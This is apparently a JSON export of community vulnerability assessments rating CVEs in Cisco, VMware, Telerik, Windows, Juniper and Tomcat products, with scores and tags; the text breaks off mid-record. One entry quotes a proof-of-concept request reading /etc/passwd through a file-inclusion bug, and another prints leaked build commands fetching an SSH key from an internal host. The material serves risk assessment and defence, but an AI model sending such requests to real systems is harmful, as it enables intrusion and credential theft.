      "document": "We had post-auth RCE in Cisco Firepower Management Console submitted as a module in PR [#7803](https://github.com/rapid7/metasploit-framework/pull/7803). This new vuln nets you admin access to the device ONLY if LDAP authentication is enabled. I don't know how common that configuration is.\r\n\r\nWhile the potential for a shell is nice, admin access to a management center for network security solutions is likely more useful. I also don't know if the admin interface is typically exposed on the WAN side, but I've seen worse. I'd expect to see this exposed on a corporate LAN, though. And if you can turn external access into internal access, it makes little difference.\r\n\r\nI don't think there's any cause for panic with this, like Citrix last week, but I'd keep my eye on this one. Cisco hasn't seen any PoCs, but it's only a matter of time.",
      "score": 3,
      "metadata": {},
      "tags": []
    },
    {
      "id": "caef36fa-854c-485c-8a03-8c04f8ec8ff5",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "87c45fb3-5cb1-4423-bb79-d0c6d1243611",
      "created": "2020-01-23T15:42:36.097619Z",
      "revisionDate": "2020-02-13T17:11:47.994695Z",
      "document": "I played around trying to create a module for this, and it matches the original PoC put out by Polarbear.  The way it works is that on a VM with the proper version of VMWare tools installed, you can run the repair operation and briefly, a trusted file in a trusted location (C:\\\\ProgramData\\\\VMware\\\\VMware CAF\\\\pme\\\\scripts\\\\stop-listener.bat) has permissions lowered.  If an attacker can touch the file at the right time, they can maintain control over the file after the repair is over if the timing is right.  The method to take that overwrite to SYSTEM is still as yet unreleased, as far as I can tell.\r\n\r\nDefenders can watch for some obvious behaviors just in this process.  The attacker has to run a specific command (msiexec /fa <installer file>), then while it is running, continually attempt to access a specific file (C:\\\\ProgramData\\\\VMware\\\\VMware CAF\\\\pme\\\\scripts\\\\stop-listener.bat), and once they control that file,  they must include malicious code and somehow somehow run it resulting in a privilege escalation.  Defenders can add this behavior to HIDS signatures as a stopgap.\r\n\r\nThis exploit relies on previous access, and results in further compromise of the VM.  While important, there are challenges to get to a location that this exploit is useful, the required files represent a bottleneck on behavior, mitigations will not affect most users, the results are limited to the VM, and a patch is already out.  Defenders should patch as soon as possible, and add mitigations quickly, but for this to be a problem, attackers must already have a foothold into the computer.",
      "score": 2,
      "metadata": {
        "stability": 3,
        "reliability": 3,
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 3,
        "mitigation-strength": 4,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "fbad19f1-3722-40bd-9f22-4f6cac5ad51e",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "e152b863-e927-4417-bc7b-1472e48fd3a1",
      "created": "2020-01-23T20:45:26.676044Z",
      "revisionDate": "2020-12-28T23:25:38.936329Z",
      "document": "This appears to be a bug with the authentication of elliptical curve cryptographic certificates definitely related to file source authentication through signing and possibly channel communications; there are unsubstantiated rumors about RCE, though I don't see a pathway for that beyond a MitM attack.  This is going to serve primarily as a local privilege escalation tool because Microsoft OSs depend on file authentication and privileged execution in some instances to avoid a requirement for user authenticated elevation for execution.  I am unclear on how difficult breaking into an established session might be, but certainly spoofed signed files would be useful to a hacker.\r\nOf the two likely scenarios, local privilege escalation seems the most likely, with MitM attacks possible.  This is likely not a wormable threat and will require some amount of time and effort on the part of the attacker.  Nation-state-level players might abuse this by owning update servers or routers and serving clients malicious signed updates or other binaries, but that's not a likely threat model for average person or even company.  In addition to the personalized nature of the attack vector, I imagine the barrier to writing even a local exploit would be higher than most, as cryptography is hard.\r\nThis is interesting, it is bad, and it should be patched, but it is not at the level of something like eternalblue or even bluekeep, in my opinion.  I think that it was reported by the NSA has caused a bit more attention to it than the vulnerability warrants, but since there is a path to exploitation and a simple patch out that should have little effect on users, you should patch immediately.",
      "score": 2,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 4,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 5,
        "mitigation-strength": 1,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "980ca57b-90b1-4595-887a-10d8f3940469",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b5d126fe-9266-41e6-a40b-09ff5b27a5a5",
      "created": "2020-01-24T00:34:27.03006Z",
      "revisionDate": "2020-02-13T17:11:47.58895Z",
      "document": "An Edge vuln might be more valuable, but plenty of people still use IE. Last I heard, there was no known PoC. Perhaps only Google and Qihoo 360 have seen these \"attacks in the wild.\"",
      "score": 2,
      "metadata": {},
      "tags": []
    },
    {
      "id": "71d7629d-b7a9-48be-867b-4abc49a8f155",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "23437d69-a42d-46bb-b507-61ee0448251f",
      "created": "2020-01-30T08:09:03.185426Z",
      "revisionDate": "2020-04-28T21:09:14.681389Z",
      "document": "This is a low-risk, high-gain vulnerability, exploiting a path inclusion (which is basically on the same impact as the Citrix ADC (Netscaler) path traversal bug). Though it's probably less likely to find these sitting on the public internet.\r\n\r\nPoC from Jin Wook Kim\r\n@wugeej\r\n\r\nhttps://twitter.com/wugeej/status/1222762164626186242\r\n\r\n```\r\n[PoC] Juniper Junos Space Local File Inclusion (CVE-2020-1611)\r\n\r\n- GET Param:\r\n (1) Set \"Format\" to \"txt\"\r\n (2) Set \"FileUrl\" to a local path\r\n\r\n- /ect/passwd\r\nGET /mainui/download?X-CSRF=Y581SFvK....53107455361&FileUrl=/etc/passwd&Format=txt&nod... HTTP/1.1\r\n```",
      "score": 6,
      "metadata": {
        "stability": 5,
        "reliability": 5,
        "attacker-value": 5,
        "exploitability": 5,
        "urgent-to-patch": 5,
        "confidence-in-ratings": 5,
        "effort-to-develop-exploit": 1
      },
      "tags": []
    },
    {
      "id": "8802ee56-606e-40e9-a922-98b8bf03389b",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "4fc938da-8785-4c40-b075-10cb6394cd91",
      "created": "2020-02-03T07:40:02.569559Z",
      "revisionDate": "2020-02-13T17:11:46.969487Z",
      "document": "This isn't a default in most installations I've seen. Looks like Linux Mint uses it, though, and that's a decently sized target, IMHO. Popular for new users to Linux, which kind of explains why they'd turn on this particular setting. That said, I don't think the corporate impact is high - unless they're using Mint for workstations.\r\n\r\nGreat find, Joe. :-)",
      "score": 1,
      "metadata": {},
      "tags": []
    },
    {
      "id": "62a39524-dfba-439c-900b-0f712b1225b7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "d1546f47-6385-4452-85b4-bcd67f93af06",
      "created": "2020-02-04T20:16:32.066751Z",
      "revisionDate": "2020-02-13T17:11:46.772809Z",
      "document": "The attacker utility for this particular vulnerability is limited by the hardware dependency. Additionally the vulnerability as described in the [original disclosure](https://talosintelligence.com/vulnerability_reports/TALOS-2019-0964) can not be used for privilege escalation, only VMWare escapes.\r\n\r\nThe `vmware-vmx.exe` process on the host OS runs as the user which started VMware which is why the vulnerability would not yield SYSTEM privileges on the host. At the time of this writing, the `vmware-vmx.exe` process does not utilize the new Control Flow Guard which would make it easier to overwrite an entry in the vtable with a function pointer, aiding in exploit development.\r\n\r\nWhile a failed exploit attempt would not crash the host OS because the vulnerability is not kernel mode, the VMWare guest maybe affected and become unresponsive.",
      "score": 3,
      "metadata": {
        "stability": 3,
        "reliability": 4,
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 3,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "fa40c66e-fb55-4a12-a69c-9d8e11d325a5",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "d1546f47-6385-4452-85b4-bcd67f93af06",
      "created": "2020-02-04T20:31:32.130361Z",
      "revisionDate": "2020-02-13T17:11:46.577437Z",
      "document": "This is one of a set of vulnerabilities discovered in the AMD Radeon graphics drivers for VMWare workstation by Talos including DoS vulnerabilities CVE-2019-5124, CVE-2019-5147, CVE-2019-5146.  2019-5183 is important because it allows overwriting the vtable and causing arbitrary code execution on the host OS, ~~~likely as a privileged~~~ user under vmware-vmx.exe.  The breakout allows an assailant to leave the Guest OS and enter the host OS.\r\nWhile it poses a risk, many mitigating factors affect the utility of the vulnerability.  This is a local exploit to the guest operating system, and thus requires previous access through another means.  Talos performed coordinated disclosure, so this vulnerability is already patched, allowing a fast mitigation strategy.  Further, given the limited and local nature of VMWare workstation, as well as the necessity for a specific driver to be in use, the reduced surface area for attackers decreases the return on investment to develop an attack which to my knowledge has not been seen in the wild, yet.\r\nBottom line is that this poses a risk and should be addressed, but it is not a scary, immediate risk.  Continue to patch through patching cycles and add signatures to IDS systems, but unless you have a very aggressive threat model, this is not an immediate threat.",
      "score": 3,
      "metadata": {
        "stability": 4,
        "reliability": 4,
        "attacker-value": 2,
        "exploitability": 3,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 5
      },
      "tags": []
    },
    {
      "id": "ecd628a4-b3bc-4dcf-98d1-c72c44046fd7",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "90dddbf9-ea58-4470-b821-c35007a64bd6",
      "created": "2020-02-05T18:37:57.660464Z",
      "revisionDate": "2020-10-13T20:18:02.504772Z",
      "document": "This vulnerability originally outlined by [bishopfox](https://know.bishopfox.com/research/cve-2019-18935-remote-code-execution-in-telerik-ui) is a variation on CVE-2017-11317. The patch for CVE-2017-11317 introduced encryption on the object which prevents an attacker from modifying the object in such a way to achieve file upload as the original did. This mitigation, however uses a default value for the encryption key of `PrivateKeyForEncryptionOfRadAsyncUploadConfiguration` that if left unchanged can be used to encrypt an object to reproduce similar conditions to CVE-2017-11317. With the ability to upload an arbitrary file, a Mixed Mode Assembly can be uploaded to achieve RCE through the deserializeation functionality in `JavaScriptSerializer.\r\n\r\nUsers should change their encryption key (as [recommended](https://docs.telerik.com/devtools/aspnet-ajax/controls/asyncupload/security?_ga=2.98618715.414867971.1580929998-674280231.1580929998) by Telerik) to a strong password and restart their server to mitigate this vulnerability. At that point an attacker would have to recover that secret value to leverage this attack chain. Versions after and including R2 2017 SP1 are not configured with a default encryption key, making exploiting this dependent on recovering the key through another means.\r\n\r\nMitigation Strength set to 3/5 due to it being dependent on the strength of the password.",
      "score": 5,
      "metadata": {
        "stability": 4,
        "reliability": 4,
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 5,
        "used-successfully": 1,
        "mitigation-strength": 3,
        "confidence-in-ratings": 4,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "fde89e1b-3940-467d-bffb-ed45c6e30a6b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "71cb77ac-c7ad-4f7a-b13e-32a651d1cde0",
      "created": "2020-02-06T18:44:23.192048Z",
      "revisionDate": "2020-03-03T16:19:03.347224Z",
      "document": "This vulnerability is described as a \"Stack overflow\" by the original [disclosure notice](https://www.armis.com/cdpwn/).\r\n\r\nAn attacker would need to be on the local area network, directly attached to the vulnerable switch running NX-OS. This is due to CDP traffic not being forwarded across network boundaries. An attacker leveraging this vulnerability would likely either be physically in the building or have compromised a host which is physically in the building. Successful exploitation could create a denial of service of allow the attacker to hop VLANs. The later is effectively bypassing segmentation and would be of great concern within PCI environments where segmentation is mandated through regulations.",
      "score": 9,
      "metadata": {
        "stability": 2,
        "reliability": 3,
        "attacker-value": 3,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 4
      },
      "tags": []
    },
    {
      "id": "55a38808-b356-444b-a8a7-e3dd9a89a7be",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "1eb6a6aa-8081-4030-bc12-58cfd5c47668",
      "created": "2020-02-06T18:53:18.900901Z",
      "revisionDate": "2020-10-21T02:36:21.910596Z",
      "document": "This vulnerability is described as a format string vulnerability by the original [disclosure notice](https://www.armis.com/cdpwn/). This class of vulnerabilities is well documented and relatively reliable to exploit given the necessary primitives.\r\n\r\nAn attacker would need to be on the local area network, directly attached to the vulnerable switch running IOS-XR. This is due to CDP traffic not being forwarded across network boundaries. An attacker leveraging this vulnerability would likely either be physically in the building or have compromised a host which is physically in the building. Successful exploitation could create a denial of service or allow the attacker to hop VLANs. The later is effectively bypassing segmentation and would be of great concern within PCI environments where segmentation is mandated through regulations. Additionally due to the affected device being a router, it's possible that an attacker could use this vantage point to manipulate, intercept and eavesdrop on traffic.",
      "score": 5,
      "metadata": {
        "stability": 3,
        "reliability": 3,
        "attacker-value": 4,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "c8d64dbc-d164-49f5-975a-252bab34ad0f",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "039affc5-6de8-4fe9-9eb8-0342b32a173c",
      "created": "2020-02-06T19:45:26.932181Z",
      "revisionDate": "2020-02-13T17:11:45.736596Z",
      "document": "This vulnerability can reportedly only be used to trigger a denial of service condition on VoIP phones, potentially in a wide spread fashion. This would likely disrupt business but would not grant the attacker access to any sensitive information. Business in which affected VoIP phones are used to generate revenue such as commercial and support call centers.\r\n\r\nAn attacker would need to be on the local area network, directly attached to the vulnerable switch running IOS-XR. This is due to CDP traffic not being forwarded across network boundaries. An attacker leveraging this vulnerability would likely either be physically in the building or have compromised a host which is physically in the building. Successful exploitation would create a denial of service condition..",
      "score": 4,
      "metadata": {
        "stability": 1,
        "reliability": 3,
        "attacker-value": 2,
        "exploitability": 4,
        "urgent-to-patch": 3,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "78e3ba5c-79da-4708-bce1-bbd853599928",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "ef56742f-28ca-44aa-8631-7ff13fe97ff7",
      "created": "2020-02-06T19:52:59.801498Z",
      "revisionDate": "2020-02-13T17:11:45.538629Z",
      "document": "This is a heap buffer overflow vulnerability in the parser of CDP packets in the Cisco 8000 Series IP cameras. Successfully exploiting this vulnerability would lead to a denial of service condition or potentially access to the video feed. The affected binary reportedly lacks ASLR support, which would aid efforts to produce a functioning exploit.\r\n\r\nAn attacker would need to be on the local area network as the affected IP camera This is due to CDP traffic not being forwarded across network boundaries. An attacker leveraging this vulnerability would likely either be physically in the building or have compromised a host which is physically in the building.",
      "score": 2,
      "metadata": {
        "stability": 2,
        "reliability": 2,
        "attacker-value": 2,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 3
      },
      "tags": []
    },
    {
      "id": "771a2141-36ef-499e-9140-9478ed56e6bc",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "e0eee836-45d4-4f67-afb6-ab65811b6b35",
      "created": "2020-02-06T19:58:53.847187Z",
      "revisionDate": "2020-02-13T17:11:45.264391Z",
      "document": "This vulnerability can be used to trigger a memory exhaustion attack on affected routers within the CDP process. Once the process is out of memory it will crash and the router will reboot causing a denial of service condition for the network. Exploiting this vulnerability would not yield access to sensitive information or bypass segmentation (unless an improperly configured fail over setup is in place).\r\n\r\nAn attacker would need to be on the local area network, attached to the vulnerable router. This is due to CDP traffic not being forwarded across network boundaries. An attacker leveraging this vulnerability would likely either be physically in the building or have compromised a host which is physically in the building.",
      "score": 4,
      "metadata": {
        "stability": 1,
        "reliability": 3,
        "attacker-value": 2,
        "exploitability": 4,
        "urgent-to-patch": 4,
        "used-successfully": 1,
        "mitigation-strength": 5,
        "confidence-in-ratings": 2,
        "effort-to-develop-exploit": 2
      },
      "tags": []
    },
    {
      "id": "25bf40c7-6cf9-4a4c-b82f-b9c7e8cc2a3b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "d5c5bcec-3b84-419d-8830-a62a18d8c11d",
      "created": "2020-02-14T17:17:49.436229Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This vulnerability leverages a TOCTOU vulnerability in the \"Standard Collector Service\" used by Visual Studio. If an attacker can change the contents of an ETL file by winning a race condition, the file can then be written to an arbitrary location using a symlink. This can then be used to load an attacker controlled DLL into another process.",
      "score": 2,
      "metadata": {
        "tags": [
          "default_configuration"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "8998cb3f-6a07-44eb-8ea7-b5ff33b9fcc5",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "b9fc4ad2-0100-450a-973a-8b0a9808cdff",
      "created": "2020-02-18T18:51:52.620663Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "> Although the application was only accessible to authorised users, the lowest privilege (the Browser role) was sufficient in order to exploit this issue.\r\n\r\nhttps://www.mdsec.co.uk/2020/02/cve-2020-0618-rce-in-sql-server-reporting-services-ssrs/\r\n\r\nMy testing confirmed that the endpoint is post-auth. No idea how to configure anonymous users yet, if possible. Uses Windows auth by default. Needed a password to get anywhere. Not really a problem in a Windows environment. So, if you have creds, this could be potentially useful pivot point.\r\n\r\nI don't know how common this is in enterprise environments, but it seems to be a likely pairing with Microsoft's SQL Server. That may gain you access to useful information.",
      "score": 2,
      "metadata": {
        "tags": [
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        }
      ]
    },
    {
      "id": "668e185a-b61a-4f35-888a-efd49cdec45f",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "8e8b3aa3-02e0-4b8b-ae36-6c05936df558",
      "created": "2020-02-20T18:29:15.312644Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "It looks like the base software is installed as part of a Centos 7 system. Customizations are found in the 'hardening' directory on the installer ISO file.\r\n\r\natlantis-post-install.sh looks interesting, as it sets up all of the services and unpacks the custom file satellite-install.tgz\r\n\r\nHasty diff between 201910 and 202001\r\n\r\n```\r\n$ diff -u /mnt/hardening/atlantis-post-install.sh atlantis-post-install.sh \r\n--- /mnt/hardening/atlantis-post-install.sh\t2019-11-20 13:01:24.000000000 -0600\r\n+++ atlantis-post-install.sh\t2020-01-29 22:03:41.000000000 -0600\r\n@@ -68,7 +68,8 @@\r\n firewall-offline-cmd --zone=user --add-service=ssh\r\n firewall-offline-cmd --zone=user --add-rich-rule='rule family=ipv4 port port=443 protocol=tcp reject'\r\n firewall-offline-cmd --zone=user --add-rich-rule='rule family=ipv6 port port=443 protocol=tcp reject'\r\n-# dmz zone already exists\r\n+# dmz zone already exists (ssh service is inherited - we remopve it here)\r\n+firewall-offline-cmd --zone=dmz --remove-service-from-zone=ssh\r\n firewall-offline-cmd --zone=dmz --add-rich-rule='rule family=ipv4 port port=80 protocol=tcp reject'\r\n firewall-offline-cmd --zone=dmz --add-rich-rule='rule family=ipv4 port port=443 protocol=tcp reject'\r\n firewall-offline-cmd --zone=dmz --add-rich-rule='rule family=ipv4 port port=8443 protocol=tcp reject'\r\n```\r\n\r\nInterestingly the docker layers that appear to be part of the build leak a number of internal Cisco resource names:\r\n\r\n```\r\n    curl http://timaeus.cisco.com/devKey \\u003e ~/.ssh/id_rsa \\u0026\\u0026     chmod 0600 ~/.ssh/id_rsa \\u0026\\u0026     eval `ssh-agent` \\u0026\\u0026     ssh-add \\u0026\\u0026     ssh-keyscan -p 7999 -t rsa bitbucket-eng-sjc1.cisco.com \\u003e\\u003e ~/.ssh/known_hosts \\u0026\\u0026     bundle install --with cerberus --without development test alpha \\u0026\\u0026     rm -rf ~/.ssh \\u0026\\u0026     bundle config --global frozen 1;\"},{\"created\":\"2019-11-21T05:24:36.571974064Z\",\"created_by\":\"|0 /bin/sh -c sed -i '/jessie-updates main/d' /etc/apt/sources.list\"},{\"created\":\"2019-11-21T05:26:54.698408023Z\",\"created_by\":\"|0 /bin/sh -c apt-get update \\u0026\\u0026 apt-get install -y postgresql-client\"},{\"created\":\"2019-11-21T05:26:55.987328112Z\",\"created_by\":\"|0 /bin/sh -c ln -sf /dev/stdout /usr/src/log/sidekiq.log\"},{\"created\":\"2019-11-21T05:26:56.230921929Z\",\"created_by\":\"/bin/sh -c #(nop) COPY file:31a545d2f5f434f3e031ea7c4fd4af19d67f5fb40e217c1ed1ef665da663abce in /usr/local/bin/ \"},{\"created\":\"2019-11-21T05:26:56.391769508Z\",\"created_by\":\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\" \\\"-c\\\" \\\"/bin/bash /usr/local/bin/startup.sh\\\"]\",\"empty_layer\":true}],\"os\":\"linux\",\"rootfs\":{\"type\":\"layers\",\"diff_ids\":[\r\n```\r\n\r\nOther internal creds seem to be baked into the app as well, even in the current version. This app looks worthy of future explorations, especially for the other secrets it contains. I'm just not sure how much install footprint it has in the real world, at least I've never worked for a company that would be the target market for this app.",
      "score": 3,
      "metadata": {
        "tags": [
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "a6999cc3-ecc9-4b31-8100-7a8f44a14c10",
      "editorId": "1e48c935-9ca9-4fe9-a2c4-d4555448dd53",
      "topicId": "2f0f7d23-7b28-4849-b0fc-3b12ab190d21",
      "created": "2020-02-21T19:34:14.912294Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Wrote up a technical analysis of this bug for Exodus Intelligence at https://blog.exodusintel.com/2019/05/17/windows-within-windows/. The bug itself is relatively easy to trigger if you understand how Window messages work, but is a bit tricky to understand if your not familiar with this. Exploit reliability is high unless exploiting from the Chrome sandbox; in these scenarios it is still possible to exploit the target on older versions of Windows (Windows 7 and prior) however we did find that there was some interesting behavior going on with the Chrome sandbox escape shellcode as while it would disassociate the current process with the Chrome sandbox job (and henceforth the job's limitations), it would occasionally trigger APC_INDEX_MISMATCH errors under certain conditions, particularly if the target user was an administrator.\r\n\r\nTLDR: This exploit does takes a bit of knowledge of Win32k.sys and Windows internals to exploit, but provided an attacker has this knowledge, or has access to the public exploit, they can easily escalate their privileges to a SYSTEM user from any privilege level.",
      "score": 5,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "high_privilege_access"
        ],
        "attacker-value": 5,
        "exploitability": 2
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "89f14fe2-08f5-43f5-aceb-3842cb8d4188",
      "editorId": "1e48c935-9ca9-4fe9-a2c4-d4555448dd53",
      "topicId": "8b03f841-88e2-43ce-babb-46c39235ee23",
      "created": "2020-02-21T20:00:11.433345Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "This is a vulnerability within NtGdiEnsureDpiDepDefaultGuiFontForPlateau() on Windows 10 which I wrote up an analysis of at https://versprite.com/blog/security-research/silently-patched-information-leak/. Originally I thought this was a silently patched bug, but Matt Miller corrected me on this (see https://twitter.com/epakskape/status/1215698153346744321)  The bug occurs due to the fact that GreEnsureDpiDepDefaultGuiFontForPlateau() naturally leaks the value of the win32kbase!gahDpiDepDefaultGuiFonts pointer under certain conditions. which can allow attackers to potentially bypass KASLR under certain conditions.\r\n\r\nTo the best of my knowledge, this was fixed by Microsoft patching NtGdiEnsureDpiDepDefaultGuiFontForPlateau() so that it always returns 0 by adding an extra instruction which does:\r\n\r\nxor eax, eax\r\n\r\nThis is shown in the screenshots in the article. As NtGdiEnsureDpiDepDefaultGuiFontForPlateau() was only added within Windows 10 v1709 (see j00ru's system call list at https://j00ru.vexillium.org/syscalls/win32k/64/ and search for NtGdiEnsureDpiDepDefaultGuiFontForPlateau() ) , this bug is unique to Windows 10 hosts despite the fact that this CVE actually covers several related bugs (see Matt Millers comment on this at https://twitter.com/epakskape/status/1217189528806412288).",
      "score": 4,
      "metadata": {
        "tags": [
          "default_configuration",
          "easy_to_develop",
          "common_enterprise"
        ],
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b018297e-bab4-4b0a-9b10-163d6ff70995",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "8aa21692-1900-4944-98ab-bec257302198",
      "created": "2020-02-21T22:38:53.706986Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "We're still trying to find a way to get generic RCE out of this, but it's not promising: https://twitter.com/steventseeley/status/1230871514343518208. For now, it seems to be limited to LFI in the web root.\r\n\r\nI did manage to get a shell, but it was rather contrived, since I uploaded the text file containing JSP myself, then included it. It at least did not require a `.jsp` extension, but the extension was required in the request URI.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop",
          "no_useful_data"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "0b46845c-c380-4ab9-a4a8-9d2793cb072a",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "8aa21692-1900-4944-98ab-bec257302198",
      "created": "2020-02-22T00:16:42.762481Z",
      "revisionDate": "2020-03-24T03:22:19.935651Z",
      "document": "Current PoC's offer unauthenticated LFI inside the webroot. \r\nDepending on the application and organisations configuration this could reveal sensitive information from database config or other configurations within the source code. \r\n\r\nThere is the potential for RFI / RCE although example of this are not yet public. \r\n\r\nWith a shift towards containers like Kubernetes / Docker it is important to note that older tags which may be version pinned by organisations are unlikely to be patched. \r\n\r\nThe official containers distributed by Apache include tags for vulnerable version although they do not appear to server port 8009 by default. A custom server.xml is required. This is \"Likely\" to happen. ",
      "score": 4,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "9afeec75-38bb-4e1f-a082-bd076ff37777",
      "editorId": "7ff62803-e0a8-4121-b324-d4afe9f60d43",
      "topicId": "afc76977-d355-470d-a7f6-fef7a8352b65",
